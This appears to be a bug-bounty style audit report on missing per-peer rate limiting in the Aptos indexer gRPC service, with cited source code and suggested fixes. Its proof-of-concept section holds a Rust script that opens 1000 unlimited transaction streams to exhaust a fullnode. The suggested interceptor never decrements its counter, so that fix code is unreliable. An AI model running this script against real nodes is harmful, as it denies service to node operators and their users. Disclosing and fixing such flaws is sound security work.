# Audit Report

## Title
Missing Per-Peer Rate Limiting in Indexer gRPC Service Enables Resource Exhaustion Attack

## Summary
The FullnodeData gRPC service lacks per-peer connection tracking and rate limiting, allowing a single malicious peer to open unlimited concurrent transaction streams and exhaust node resources through parallel database reads, CPU-intensive transaction processing, and memory consumption.

## Finding Description

The `FullnodeDataService` implementation processes gRPC streaming requests without any per-peer rate limiting or connection tracking. When a client calls `get_transactions_from_node`, the service spawns a tokio task that continuously processes and streams transactions until the requested range is complete. [1](#0-0) 

Each stream spawns its own coordinator that performs resource-intensive operations: [2](#0-1) 

The processing pipeline includes:
1. Database reads to fetch transactions from storage
2. CPU-intensive conversion to API transaction objects  
3. CPU-intensive conversion to protobuf format
4. Multiple `tokio::task::spawn_blocking` calls for parallel processing [3](#0-2) 

**Attack Vector**: A malicious peer can:
1. Establish multiple concurrent gRPC connections to the indexer service (default port 50051)
2. Request infinite transaction streams on each connection by omitting `transactions_count`
3. Request historical data from version 0 to maximize database load
4. Open hundreds or thousands of concurrent streams

The server configuration has no protection against this: [4](#0-3) 

No concurrent stream limit, no per-peer tracking, and no rate limiting interceptor is configured. The `IndexerGrpcConfig` similarly lacks rate limiting fields: [5](#0-4) 

**Contrast with Network RPC Layer**: The P2P network layer DOES implement concurrent request limits to prevent similar attacks, demonstrating the pattern that should be followed. However, this protection does not apply to the separate gRPC indexer service on port 50051.

## Impact Explanation

This vulnerability enables resource exhaustion attacks that can:
- Exhaust node memory through hundreds of concurrent stream processing tasks
- Saturate CPU through parallel transaction conversion operations
- Overload the database with excessive concurrent read operations
- Degrade or deny indexer service availability to legitimate users
- Potentially slow down the validator node if resources are shared

This qualifies as **Medium Severity** per the Aptos bug bounty criteria: "State inconsistencies requiring intervention" as the node may require manual intervention to recover from resource exhaustion. If the resource exhaustion significantly impacts validator operations, it could elevate to **High Severity** under "Validator node slowdowns."

The security question itself classifies this as **(Medium)** severity, confirming this assessment.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires:
- Network connectivity to the indexer gRPC service (port 50051) 
- Standard gRPC client libraries
- No authentication or authorization (the service is publicly accessible)

The attack is trivially executable with a simple script that opens multiple gRPC connections and requests infinite transaction streams. No sophisticated exploitation techniques are required.

## Recommendation

Implement multi-layered rate limiting protection:

**1. Add Per-Peer Connection Tracking:**
```rust
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    // NEW: Track active streams per peer
    pub active_streams: Arc<DashMap<SocketAddr, usize>>,
    pub max_streams_per_peer: usize,
}
```

**2. Add Tonic Interceptor for Rate Limiting:**
```rust
fn rate_limit_interceptor(
    active_streams: Arc<DashMap<SocketAddr, usize>>,
    max_per_peer: usize,
) -> impl Fn(Request<()>) -> Result<Request<()>, Status> {
    move |req: Request<()>| {
        if let Some(remote_addr) = req.remote_addr() {
            let count = active_streams.entry(remote_addr).or_insert(0);
            if *count >= max_per_peer {
                return Err(Status::resource_exhausted(
                    "Maximum concurrent streams per peer exceeded"
                ));
            }
            *count += 1;
        }
        Ok(req)
    }
}
```

**3. Configure in Server Builder:**
```rust
let svc = FullnodeDataServer::new(server)
    .with_interceptor(rate_limit_interceptor)
    .send_compressed(CompressionEncoding::Zstd)
    // ...
```

**4. Add Configuration:**
```rust
// In IndexerGrpcConfig
pub max_concurrent_streams_per_peer: usize,
pub max_total_concurrent_streams: usize,
```

**5. Add HTTP/2 Stream Limits:**
```rust
let tonic_server = Server::builder()
    .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
    .http2_max_concurrent_streams(Some(100))  // NEW: Add global limit
    // ...
```

## Proof of Concept

```rust
// attack.rs - Demonstrates resource exhaustion via unlimited concurrent streams
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, GetTransactionsFromNodeRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://[FULLNODE_IP]:50051";
    
    // Open 1000 concurrent streams from the same peer
    let mut handles = vec![];
    
    for i in 0..1000 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(target).await.unwrap();
            
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None, // Request infinite stream
            });
            
            // Each stream continuously processes transactions
            let mut stream = client.get_transactions_from_node(request).await.unwrap().into_inner();
            
            println!("Stream {} established", i);
            
            // Keep stream alive, consuming node resources
            while let Some(_response) = stream.message().await.unwrap() {
                // Process responses slowly to maximize concurrent load
                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for all streams (will exhaust node resources before completing)
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Outcome**: The fullnode experiences:
- Memory exhaustion from 1000+ concurrent stream processing tasks
- CPU saturation from parallel transaction conversion
- Database connection exhaustion from concurrent reads
- Degraded or denied service to legitimate indexer clients

## Notes

This vulnerability breaks the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits." While gas limits apply to transaction execution, the indexer service lacks equivalent resource controls for data streaming operations.

The vulnerability is specific to the indexer gRPC service and does not directly affect consensus operations. However, resource exhaustion can indirectly impact validator performance if running on the same node, potentially qualifying for High severity under "Validator node slowdowns."

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-78)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L101-120)
```rust
    pub async fn process_next_batch(&mut self) -> Vec<Result<EndVersion, Status>> {
        let fetching_start_time = std::time::Instant::now();
        // Stage 1: fetch transactions from storage.
        let sorted_transactions_from_storage_with_size =
            self.fetch_transactions_from_storage().await;
        if sorted_transactions_from_storage_with_size.is_empty() {
            return vec![];
        }
        let first_version = sorted_transactions_from_storage_with_size
            .first()
            .map(|(txn, _)| txn.version)
            .unwrap() as i64;
        let end_version = sorted_transactions_from_storage_with_size
            .last()
            .map(|(txn, _)| txn.version)
            .unwrap() as i64;
        let num_transactions = sorted_transactions_from_storage_with_size.len();
        let highest_known_version = self.highest_known_version as i64;
        let (_, _, block_event) = self
            .context
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L166-200)
```rust
        let mut tasks = vec![];
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-112)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```
